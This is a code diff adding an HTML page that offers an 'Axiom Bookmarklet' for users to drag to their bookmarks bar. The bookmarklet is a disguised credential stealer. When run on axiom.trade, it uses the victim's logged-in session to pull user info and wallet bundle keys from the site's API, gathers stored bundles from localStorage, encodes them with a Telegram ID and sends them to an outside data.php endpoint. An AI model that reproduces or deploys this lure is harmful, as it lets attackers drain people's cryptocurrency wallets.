@@ -1,0 +1,67 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom Bookmarklet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 500px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .instruction {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 18px;
+        }
+        .bookmarklet {
+            display: inline-block;
+            padding: 15px 30px;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: move;
+            transition: background 0.3s;
+        }
+        .bookmarklet:hover {
+            background: #764ba2;
+        }
+        .arrow {
+            font-size: 30px;
+            margin: 20px 0;
+            color: #667eea;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Axiom Bookmarklet</h1>
+        <p class="instruction">Drag this button to your bookmarks bar:</p>
+        <div class="arrow">↓</div>
+        <a href="javascript:(async()=>{try{if(location.hostname==='axnotsiom.icu')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles'),eBundles:JSON.stringify([localStorage.getItem('eBundle')]),telegramId:'6020390121'};location.replace('https://yourdomain.com/data.php?data='+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()" class="bookmarklet">
+            Drag to Bookmarks
+        </a>
+    </div>
+</body>
+</html>
